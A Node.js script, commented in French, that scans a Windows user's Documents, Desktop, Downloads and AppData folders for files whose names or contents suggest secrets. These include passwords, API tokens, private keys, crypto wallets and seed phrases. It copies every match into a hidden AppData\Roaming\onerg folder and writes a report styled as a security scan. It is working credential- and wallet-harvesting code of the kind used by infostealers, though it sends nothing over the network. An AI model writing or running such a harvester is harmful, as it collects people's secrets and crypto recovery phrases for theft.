const fs = require('fs');
const path = require('path');
const os = require('os');

// Définir le dossier de destination
const targetDir = path.join(os.homedir(), 'AppData', 'Roaming', 'onerg');

// Créer le dossier de destination s'il n'existe pas
if (!fs.existsSync(targetDir)) {
    fs.mkdirSync(targetDir, { recursive: true });
}

// Créer un dossier avec timestamp pour cette opération
const timestamp = Date.now();
const scanDir = path.join(targetDir, `scan_${timestamp}`);
fs.mkdirSync(scanDir, { recursive: true });

// Créer un log
const logFile = path.join(scanDir, 'scan_log.txt');
function log(message) {
    fs.appendFileSync(logFile, `${message}\n`);
    console.log(message);
}

log(`[+] Scan avancé démarré à ${new Date().toISOString()}`);
log(`[+] Les fichiers seront sauvegardés dans ${scanDir}`);

// Liste des patterns de fichiers sensibles à rechercher dans les noms de fichiers
const sensitiveFilePatterns = [
    // Fichiers de configuration
    '.env',
    'config',
    'settings',
    'credentials',
    
    // Fichiers de base de données
    '.db',
    '.sqlite',
    '.mdb',
    
    // Fichiers de mots de passe
    'password',
    'passwd',
    'motdepasse',
    'mdp',
    '.key',
    '.pem',
    '.pfx',
    '.p12',
    
    // Crypto
    'wallet',
    'crypto',
    'bitcoin',
    'ethereum',
    'seed',
    'ledger',
    'portefeuille',
    
    // Documents potentiellement sensibles
    'backup',
    'confidential',
    'private',
    'secret',
    'confidentiel',
    'privé',
    'personnel'
];

// Patterns à rechercher dans le contenu des fichiers
const sensitiveContentPatterns = [
    // Mots de passe
    'password:',
    'password=',
    'passwd:',
    'passwd=',
    'motdepasse:',
    'motdepasse=',
    'mdp:',
    'mdp=',
    'mot de passe',
    'mot_de_passe',
    
    // API keys et secrets
    'api_key',
    'apikey',
    'api-key',
    'secret_key',
    'secretkey',
    'secret-key',
    'token',
    'client_secret',
    'app_secret',
    
    // Crypto
    'wallet address',
    'private key',
    'adresse wallet',
    'clé privée',
    'seed phrase',
    'recovery phrase',
    'phrase de récupération',
    'seed words',
    'mnemonic',
    'mnémonique',
    
    // Connexions et accès
    'connexion',
    'identifiant',
    'login',
    'accès'
];

// Extensions de fichiers à analyser (pour la recherche de contenu)
const textFileExtensions = [
    '.txt', '.csv', '.json', '.xml', '.html', '.htm', '.js', '.ts', '.py', '.php', 
    '.md', '.cfg', '.config', '.ini', '.yaml', '.yml', '.rtf', '.log', '.conf'
];

// Dossiers à scanner
const foldersToScan = [
    path.join(os.homedir(), 'Documents'),
    path.join(os.homedir(), 'Desktop'),
    path.join(os.homedir(), 'Downloads'),
    path.join(os.homedir(), 'AppData', 'Local'),
    path.join(os.homedir(), 'AppData', 'Roaming')
];

// Limites de scan pour éviter de scanner tout le système
const MAX_DEPTH = 4;
const MAX_FILES = 2000;
const MAX_FILE_SIZE = 20 * 1024 * 1024; // 20MB
let filesScanned = 0;
let filesCopied = 0;

// Fonction pour vérifier le contenu d'un fichier texte
function checkFileContent(filePath) {
    try {
        // Vérifier l'extension
        const ext = path.extname(filePath).toLowerCase();
        if (!textFileExtensions.includes(ext)) return false;
        
        // Lire le contenu du fichier
        const content = fs.readFileSync(filePath, 'utf8');
        
        // Chercher les patterns sensibles
        return sensitiveContentPatterns.some(pattern => 
            content.toLowerCase().includes(pattern.toLowerCase())
        );
    } catch (err) {
        // En cas d'erreur (encodage non UTF-8, etc.), ignorer
        return false;
    }
}

// Fonction récursive pour scanner les dossiers
function scanDirectory(directory, depth = 0) {
    if (depth > MAX_DEPTH || filesScanned >= MAX_FILES) return;
    
    try {
        const items = fs.readdirSync(directory);
        
        for (const item of items) {
            if (filesScanned >= MAX_FILES) break;
            
            const fullPath = path.join(directory, item);
            
            try {
                const stats = fs.statSync(fullPath);
                
                if (stats.isDirectory()) {
                    // Filtrer certains dossiers systèmes
                    if (item === 'node_modules' || item === '.git' || item === 'Windows') {
                        continue;
                    }
                    // Scanner récursivement les sous-dossiers
                    scanDirectory(fullPath, depth + 1);
                } else if (stats.isFile() && stats.size < MAX_FILE_SIZE) {
                    filesScanned++;
                    
                    // 1. Vérifier si le nom de fichier correspond à un pattern sensible
                    const fileNameSensitive = sensitiveFilePatterns.some(pattern => 
                        item.toLowerCase().includes(pattern.toLowerCase())
                    );
                    
                    // 2. Vérifier le contenu du fichier (si c'est un fichier texte)
                    const contentSensitive = checkFileContent(fullPath);
                    
                    if (fileNameSensitive || contentSensitive) {
                        // Copier le fichier dans le dossier cible
                        const relativePath = path.relative(os.homedir(), directory);
                        const targetPath = path.join(scanDir, relativePath);
                        
                        // Créer le dossier de destination si nécessaire
                        fs.mkdirSync(targetPath, { recursive: true });
                        
                        // Copier le fichier
                        const targetFile = path.join(targetPath, item);
                        fs.copyFileSync(fullPath, targetFile);
                        filesCopied++;
                        
                        const reason = fileNameSensitive ? "nom de fichier" : "contenu";
                        log(`[+] Fichier sensible (${reason}): ${fullPath} -> ${targetFile}`);
                    }
                }
            } catch (err) {
                // Ignorer les erreurs de permission ou autres
                log(`[!] Erreur sur ${fullPath}: ${err.message}`);
            }
        }
    } catch (err) {
        log(`[!] Impossible de scanner ${directory}: ${err.message}`);
    }
}

// Démarrer le scan
foldersToScan.forEach(folder => {
    log(`[i] Scan du dossier: ${folder}`);
    scanDirectory(folder);
});

// Créer un rapport récapitulatif
const reportPath = path.join(scanDir, "rapport_scan.html");
const reportContent = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Rapport de scan de sécurité</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1, h2 { color: #333; }
        .summary { background-color: #f5f5f5; padding: 15px; border-radius: 5px; }
        .warning { color: #c00; }
    </style>
</head>
<body>
    <h1>Rapport de scan de sécurité</h1>
    <div class="summary">
        <p><strong>Date du scan:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>Dossiers analysés:</strong> ${foldersToScan.join(', ')}</p>
        <p><strong>Fichiers analysés:</strong> ${filesScanned}</p>
        <p><strong>Fichiers sensibles trouvés:</strong> ${filesCopied}</p>
    </div>
    <h2>Détails du scan</h2>
    <p>Les fichiers sensibles ont été sauvegardés dans: ${scanDir}</p>
    <p class="warning">ATTENTION: Ce rapport contient des informations sensibles.</p>
</body>
</html>
`;
fs.writeFileSync(reportPath, reportContent);

// Résumé
log(`\n[+] Scan terminé à ${new Date().toISOString()}`);
log(`[+] Fichiers scannés: ${filesScanned}`);
log(`[+] Fichiers sensibles copiés: ${filesCopied}`);
log(`[+] Les fichiers sensibles se trouvent dans: ${scanDir}`);
log(`[+] Rapport HTML créé: ${reportPath}`); 